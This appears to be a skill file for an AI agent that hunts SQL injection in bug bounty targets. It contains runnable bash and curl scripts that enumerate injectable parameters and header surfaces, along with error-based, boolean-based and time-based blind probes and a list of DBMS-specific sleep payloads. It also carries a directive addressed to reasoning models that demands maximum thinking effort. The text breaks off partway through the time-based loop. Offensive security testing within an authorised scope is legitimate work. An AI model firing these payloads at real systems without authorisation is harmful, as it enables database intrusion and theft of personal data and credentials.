---
name: sqli-hunter
description: Systematically hunt for SQL injection vulnerabilities across all injection surfaces: in-band (error-based, union-based), blind (boolean-based, time-based), out-of-band (DNS/HTTP exfiltration), second-order, and ORM/NoSQL injection. Covers manual detection, WAF fingerprinting and bypass, sqlmap configuration, and full exploitation chains from data extraction to RCE via INTO OUTFILE or xp_cmdshell. Use this skill whenever a target reflects database errors, accepts user input that may be interpolated into SQL queries, or uses a backend identified as MySQL, PostgreSQL, MSSQL, Oracle, or SQLite. Trigger on phrases like "sql injection", "sqli", "sqli-hunter", "test for injection", "database errors", or when recon reveals parameters named id, user, search, order, sort, category, filter, page, product, item, name, or any numeric/UUID parameter feeding a lookup endpoint.
---

# SQLi Hunter Skill

You are hunting for SQL injection. SQLi is one of the most consistently Critical findings in bug bounty — database read access = PII exfiltration, credentials, and internal secrets. Write access = data destruction or full server compromise via file write or OS command execution. The challenge in modern targets is that raw SQL errors are rare, WAFs are common, and ORMs provide partial protection. Your job is to probe intelligently, distinguish true positives from false positives, bypass WAF/filtering, and build the full extraction chain before submitting.

Run all phases in order. Phase 1 maps every injection surface. Phase 2 detects SQLi type. Phase 3 exploits in-band. Phase 4 handles blind. Phase 5 handles WAF bypass. Phase 6 covers second-order and ORM injection. Phase 7 builds the impact chain.

> **THINKING LLM DIRECTIVE — MAXIMUM EFFORT REQUIRED**
> If you are a reasoning/thinking model (o1, o3, Claude with extended thinking, Gemini with thinking, DeepSeek-R1, QwQ, or any model with a dedicated reasoning/thinking phase): **activate maximum thinking budget for this skill**. SQLi detection, WAF fingerprinting, payload construction for blind injection, and DBMS-specific exploitation require deep sequential reasoning. A single wrong assumption about the injection context or DBMS version wastes hours. Think fully before acting on every phase transition, every bypass attempt, and every extraction query. Do not truncate your reasoning.

---

## Prerequisites

- Burp Suite active with logging enabled
- sqlmap available at `/usr/bin/sqlmap` or `/home/kali/go/bin/sqlmap`
- OOB infrastructure (Burp Collaborator / interactsh) for out-of-band detection
- All assets confirmed IN SCOPE via `/scope-checker`

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/sqli
export OOB_URL="your-id.oast.fun"   # interactsh or Burp Collaborator
export SESSION_COOKIE="[your auth cookie]"
export TARGET_DOMAIN="[target domain]"
```

---

## Phase 1 — Surface Enumeration

### Step 1.1 — Identify SQLi-Prone Parameters

```bash
# SQLi-prone parameter names
SQLI_PARAMS="id|user_id|item_id|product_id|order_id|cat|category|page"
SQLI_PARAMS+="|search|q|query|filter|sort|order|orderby|sortby|group"
SQLI_PARAMS+="|name|title|username|email|token|key|ref|code|type|status"
SQLI_PARAMS+="|from|to|start|end|offset|limit|year|month|day|date|since"

grep -iEh "[?&](${SQLI_PARAMS})=[^&]+" \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/sqli/candidate-params.txt

echo "[*] SQLi candidate parameters: $(wc -l < $TARGET_DIR/recon/sqli/candidate-params.txt)"
```

### Step 1.2 — Identify High-Priority Surfaces

Classify candidates by injection likelihood:

| Priority | Surface Type | Indicator |
|---|---|---|
| **Critical** | Numeric ID parameter (`?id=1`) | Direct row lookup, common raw SQL |
| **Critical** | Search / filter with ORDER BY | Often raw `ORDER BY $col $dir` interpolation |
| **High** | Login form (username/password) | Authentication bypass vector |
| **High** | UUID/GUID parameter | May still be interpolated unsafely |
| **High** | JSON body parameters to API | ORM may use raw queries for performance |
| **Medium** | String parameters (name, query) | Often parameterized but worth testing |
| **Low** | Parameters with visible encoding | Likely sanitized/encoded pipeline |

```bash
# Separate numeric ID params (highest priority)
grep -iE '[?&](id|item_id|user_id|product_id|order_id|cat_id)=[0-9]+' \
  $TARGET_DIR/recon/sqli/candidate-params.txt | \
  sort -u > $TARGET_DIR/recon/sqli/numeric-id-params.txt

echo "[*] Numeric ID params (highest priority): $(wc -l < $TARGET_DIR/recon/sqli/numeric-id-params.txt)"
```

### Step 1.3 — Identify HTTP Headers as Injection Surfaces

Many applications log or process HTTP headers and insert them into queries:

```bash
# Test injection via headers that may be stored/queried
HEADER_SURFACES=(
  "X-Forwarded-For"
  "X-Real-IP"
  "User-Agent"
  "Referer"
  "X-Forwarded-Host"
  "X-Custom-IP-Authorization"
  "X-Remote-IP"
  "X-Originating-IP"
)

for HEADER in "${HEADER_SURFACES[@]}"; do
  RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://$TARGET_DOMAIN/" \
    -H "Cookie: $SESSION_COOKIE" \
    -H "${HEADER}: '" \
    --max-time 8)
  echo "[$RESPONSE] $HEADER: '"
done | tee $TARGET_DIR/recon/sqli/header-probe.txt
# 500 responses to a single quote in a header = strong candidate
```

---

## Phase 2 — Detection and Type Classification

### Step 2.1 — Error-Based Detection (Single Quote)

For each candidate parameter, inject a single quote and observe the response:

```bash
while IFS= read -r ENDPOINT; do
  PARAM=$(echo "$ENDPOINT" | grep -oP '(?<=[?&])[^=]+(?==)' | head -1)
  BASE=$(echo "$ENDPOINT" | sed 's/[?&][^?&]*$//')
  ORIG_VAL=$(echo "$ENDPOINT" | grep -oP "(?<=${PARAM}=)[^&]+" | head -1)

  # Inject single quote
  RESP_SQ=$(curl -sk \
    -G "$BASE" --data-urlencode "${PARAM}=${ORIG_VAL}'" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)

  # Check for error indicators
  if echo "$RESP_SQ" | grep -iqE \
    '(sql syntax|mysql_fetch|pg_query|ORA-[0-9]+|sqlite_|ODBC|DB2|Sybase|
      syntax error|unclosed quotation|unterminated string|quoted string|
      You have an error in your SQL|Warning.*mysql|Division by zero|
      supplied argument is not|invalid query|unexpected end of SQL|
      SQLSTATE|PDOException|java\.sql\.|System\.Data\.SqlClient)'; then
    echo "[ERROR-BASED SQLi CANDIDATE] $PARAM in $BASE"
    echo "$ENDPOINT" >> $TARGET_DIR/recon/sqli/error-based-candidates.txt
  fi
done < $TARGET_DIR/recon/sqli/candidate-params.txt
```

### Step 2.2 — Boolean-Based Blind Detection

For parameters where single-quote injection produces no visible error, test boolean conditions:

```bash
# For a numeric param ?id=1:
# True condition: AND 1=1 (should behave like original)
# False condition: AND 1=2 (should return empty/different response)

PARAM="id"
BASE_URL="https://$TARGET_DOMAIN/api/item"
ORIG="1"

RESP_ORIG=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${ORIG}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)

RESP_TRUE=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${ORIG} AND 1=1" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)

RESP_FALSE=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${ORIG} AND 1=2" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10)

# Compare response sizes
SIZE_ORIG=$(echo "$RESP_ORIG" | wc -c)
SIZE_TRUE=$(echo "$RESP_TRUE" | wc -c)
SIZE_FALSE=$(echo "$RESP_FALSE" | wc -c)

echo "Orig: $SIZE_ORIG | True: $SIZE_TRUE | False: $SIZE_FALSE"
# If TRUE ≈ ORIG and FALSE ≠ ORIG → boolean-based blind SQLi confirmed
```

### Step 2.3 — Time-Based Blind Detection

For completely opaque endpoints (same response regardless of payload), use time-based detection:

```bash
# DBMS-specific sleep payloads — test one at a time
TIME_PAYLOADS=(
  # MySQL
  "1 AND SLEEP(5)"
  "1' AND SLEEP(5)--"
  "1 AND SLEEP(5)--"
  # PostgreSQL
  "1; SELECT pg_sleep(5)--"
  "1' AND (SELECT 1 FROM pg_sleep(5))--"
  # MSSQL
  "1; WAITFOR DELAY '0:0:5'--"
  "1' WAITFOR DELAY '0:0:5'--"
  # Oracle
  "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
  "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
  # SQLite
  "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--"
)

for PAYLOAD in "${TIME_PAYLOADS[@]}"; do
  START=$(date +%s%3N)
  curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 15 > /dev/null
  END=$(date +%s%3N)
  ELAPSED=$(( END - START ))
  echo "[${ELAPSED}ms] $PAYLOAD"
  